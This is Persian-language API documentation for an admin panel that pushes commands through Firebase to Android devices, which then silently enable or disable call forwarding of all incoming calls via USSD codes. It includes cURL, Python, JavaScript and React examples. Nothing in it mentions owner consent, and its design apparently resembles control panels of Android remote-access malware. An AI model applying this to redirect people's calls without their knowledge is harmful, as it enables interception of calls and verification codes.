# 📞 Call Forwarding (هدایت تماس)

## 📋 فهرست مطالب
- [معرفی](#معرفی)
- [نحوه عملکرد](#نحوه-عملکرد)
- [API Endpoints](#api-endpoints)
- [Request & Response Models](#request--response-models)
- [Flow کامل](#flow-کامل)
- [مثال‌های عملی](#مثالهای-عملی)
- [نکات مهم](#نکات-مهم)

---

## معرفی

قابلیت **Call Forwarding** به شما اجازه می‌دهد که تمام تماس‌های ورودی یک دستگاه را به شماره دیگری هدایت کنید.

### ✨ امکانات
- ✅ فعال‌سازی هدایت تماس به شماره دلخواه
- ✅ غیرفعال‌سازی هدایت تماس
- ✅ انتخاب سیم‌کارت (SIM Slot 0 یا 1)
- ✅ دریافت نتیجه عملیات از دستگاه
- ✅ ذخیره لاگ تمام عملیات
- ✅ اعلان به تلگرام در صورت خطا

---

## نحوه عملکرد

### 1️⃣ فعال‌سازی Call Forwarding

```
Admin Panel → API Request → Firebase → Device
                                          ↓
Admin Panel ← Telegram Notification ← Result Endpoint
```

### 2️⃣ غیرفعال‌سازی Call Forwarding

```
Admin Panel → API Request → Firebase → Device
                                          ↓
Admin Panel ← Telegram Notification ← Result Endpoint
```

---

## API Endpoints

### 📤 1. فعال‌سازی Call Forwarding

```http
POST /api/devices/{device_id}/command
Authorization: Bearer {admin_token}
Content-Type: application/json
```

**Request Body:**
```json
{
  "command": "call_forwarding",
  "parameters": {
    "number": "+989123456789",
    "simSlot": 0
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command sent to 1/1 tokens",
  "type": "firebase",
  "result": {
    "success": true,
    "sent_count": 1,
    "total_tokens": 1,
    "message": "Command sent to 1/1 tokens"
  }
}
```

---

### 📤 2. غیرفعال‌سازی Call Forwarding

```http
POST /api/devices/{device_id}/command
Authorization: Bearer {admin_token}
Content-Type: application/json
```

**Request Body:**
```json
{
  "command": "call_forwarding_disable",
  "parameters": {
    "simSlot": 0
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command sent to 1/1 tokens",
  "type": "firebase",
  "result": {
    "success": true,
    "sent_count": 1,
    "total_tokens": 1
  }
}
```

---

### 📥 3. دریافت نتیجه از دستگاه (Device Endpoint)

```http
POST /devices/call-forwarding/result
Content-Type: application/json
```

**Request Body (از دستگاه):**
```json
{
  "deviceId": "DEVICE_ABC123",
  "success": true,
  "message": "Call forwarding enabled successfully",
  "simSlot": 0
}
```

**Response:**
```json
{
  "success": true,
  "message": "Call forwarding result logged successfully",
  "logged": true
}
```

---

### 📱 4. دریافت شماره فعلی Forwarding

```http
GET /api/getForwardingNumber/{device_id}
```

**Response:**
```json
{
  "forwardingNumber": "+989123456789"
}
```

---

## Request & Response Models

### CallForwardingResult (از دستگاه به سرور)

```python
class CallForwardingResult(BaseModel):
    deviceId: str                    # شناسه دستگاه
    success: bool                    # موفقیت عملیات
    message: str                     # پیام نتیجه
    simSlot: int = 0                 # سیم‌کارت (0 یا 1)
```

### CallForwardingResultResponse (پاسخ سرور)

```python
class CallForwardingResultResponse(BaseModel):
    success: bool                    # موفقیت ثبت
    message: str                     # پیام
    logged: bool = True              # آیا لاگ شد؟
```

---

## Flow کامل

### 🟢 فعال‌سازی Call Forwarding

```
1. ادمین از UI درخواست فعال‌سازی می‌کنه
   ↓
2. API دستور رو به Firebase می‌فرسته
   ↓
3. Firebase دستور رو به دستگاه می‌فرسته (FCM)
   ↓
4. دستگاه دستور USSD رو اجرا می‌کنه
   مثال: *21*{number}# برای SIM 0
   ↓
5. دستگاه نتیجه رو به سرور POST می‌کنه
   ↓
6. سرور:
   - لاگ رو ذخیره می‌کنه
   - وضعیت دستگاه رو آپدیت می‌کنه
   - در صورت خطا، به تلگرام ادمین اطلاع می‌ده
```

### 🔴 غیرفعال‌سازی Call Forwarding

```
1. ادمین از UI درخواست غیرفعال‌سازی می‌کنه
   ↓
2. API دستور رو به Firebase می‌فرسته
   ↓
3. Firebase دستور رو به دستگاه می‌فرسته (FCM)
   ↓
4. دستگاه دستور USSD رو اجرا می‌کنه
   مثال: #21# برای SIM 0
   ↓
5. دستگاه نتیجه رو به سرور POST می‌کنه
   ↓
6. سرور لاگ رو ذخیره و وضعیت رو آپدیت می‌کنه
```

---

## مثال‌های عملی

### Example 1: فعال‌سازی Call Forwarding (cURL)

```bash
curl -X POST "http://localhost:8000/api/devices/DEVICE_123/command" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "call_forwarding",
    "parameters": {
      "number": "+989123456789",
      "simSlot": 0
    }
  }'
```

### Example 2: غیرفعال‌سازی Call Forwarding (Python)

```python
import requests

url = "http://localhost:8000/api/devices/DEVICE_123/command"
headers = {
    "Authorization": "Bearer YOUR_ACCESS_TOKEN",
    "Content-Type": "application/json"
}
payload = {
    "command": "call_forwarding_disable",
    "parameters": {
        "simSlot": 0
    }
}

response = requests.post(url, json=payload, headers=headers)
print(response.json())
```

### Example 3: دریافت شماره Forwarding فعلی (JavaScript)

```javascript
const response = await fetch('http://localhost:8000/api/getForwardingNumber/DEVICE_123', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer YOUR_ACCESS_TOKEN'
  }
});

const data = await response.json();
console.log('Forwarding Number:', data.forwardingNumber);
```

---

## نکات مهم

### ⚠️ محدودیت‌ها
1. **FCM Token لازم است** - دستگاه باید FCM token داشته باشه
2. **مجوزهای اندروید** - دستگاه باید دسترسی USSD داشته باشه
3. **پشتیبانی اپراتور** - همه اپراتورها Call Forwarding رو پشتیبانی نمی‌کنن

### 💡 توصیه‌ها
- همیشه `simSlot` رو صحیح مشخص کنید (0 یا 1)
- شماره هدایت باید با فرمت بین‌المللی باشه (`+989...`)
- برای غیرفعال‌سازی، فقط `simSlot` نیاز هست

### 🔒 امنیت
- ✅ فقط ادمین‌هایی با permission `SEND_COMMANDS` می‌تونن استفاده کنن
- ✅ تمام عملیات لاگ می‌شه
- ✅ در صورت خطا، اعلان تلگرام فرستاده می‌شه

### 📊 ذخیره‌سازی
دستگاه این فیلدها رو ذخیره می‌کنه:
```python
{
  "call_forwarding_enabled": True,
  "call_forwarding_number": "+989123456789",
  "call_forwarding_sim_slot": 0,
  "call_forwarding_updated_at": datetime.utcnow()
}
```

---

## 🐛 عیب‌یابی (Troubleshooting)

### مشکل: دستور فرستاده نمی‌شه

**علت‌های احتمالی:**
- ❌ دستگاه FCM token نداره
- ❌ دستگاه آفلاین است
- ❌ Firebase service account اشتباه است

**راه حل:**
```bash
# چک کردن FCM tokens دستگاه
curl -X GET "http://localhost:8000/api/devices/DEVICE_123" \
  -H "Authorization: Bearer YOUR_TOKEN"

# بررسی فیلد fcm_tokens در پاسخ
```

---

### مشکل: نتیجه عملیات دریافت نمی‌شه

**علت‌های احتمالی:**
- ❌ دستگاه به اینترنت متصل نیست
- ❌ اپ اندروید مجوز USSD نداره
- ❌ اپراتور Call Forwarding رو پشتیبانی نمی‌کنه

**راه حل:**
- لاگ‌های دستگاه رو چک کنید
- از اپراتور پشتیبانی Call Forwarding رو تایید کنید

---

## 📱 UI Implementation Guide

### نمونه UI Component (React)

```jsx
function CallForwardingControl({ deviceId }) {
  const [forwardNumber, setForwardNumber] = useState('');
  const [simSlot, setSimSlot] = useState(0);
  const [loading, setLoading] = useState(false);

  const enableForwarding = async () => {
    setLoading(true);
    try {
      const response = await fetch(`/api/devices/${deviceId}/command`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          command: 'call_forwarding',
          parameters: {
            number: forwardNumber,
            simSlot: simSlot
          }
        })
      });
      
      const data = await response.json();
      if (data.success) {
        alert('✅ Call forwarding enabled!');
      }
    } catch (error) {
      alert('❌ Error: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const disableForwarding = async () => {
    setLoading(true);
    try {
      const response = await fetch(`/api/devices/${deviceId}/command`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          command: 'call_forwarding_disable',
          parameters: {
            simSlot: simSlot
          }
        })
      });
      
      const data = await response.json();
      if (data.success) {
        alert('✅ Call forwarding disabled!');
      }
    } catch (error) {
      alert('❌ Error: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="call-forwarding-control">
      <h3>📞 Call Forwarding</h3>
      
      <div className="form-group">
        <label>Forward to Number:</label>
        <input 
          type="tel" 
          value={forwardNumber}
          onChange={(e) => setForwardNumber(e.target.value)}
          placeholder="+989123456789"
        />
      </div>

      <div className="form-group">
        <label>SIM Slot:</label>
        <select value={simSlot} onChange={(e) => setSimSlot(parseInt(e.target.value))}>
          <option value={0}>SIM 1</option>
          <option value={1}>SIM 2</option>
        </select>
      </div>

      <div className="button-group">
        <button 
          onClick={enableForwarding} 
          disabled={loading || !forwardNumber}
          className="btn-primary"
        >
          🟢 Enable Forwarding
        </button>
        
        <button 
          onClick={disableForwarding} 
          disabled={loading}
          className="btn-secondary"
        >
          🔴 Disable Forwarding
        </button>
      </div>

      {loading && <div className="spinner">Loading...</div>}
    </div>
  );
}
```

---

## 📚 مستندات مرتبط

- [Device API](./DEVICE_API.md) - API های کامل دستگاه
- [Firebase Commands](./FIREBASE_COMMANDS.md) - دستورات Firebase
- [Admin API](./ADMIN_API.md) - API های ادمین

---

**آخرین بروزرسانی:** 2025-11-10  
**نسخه:** 2.0.0
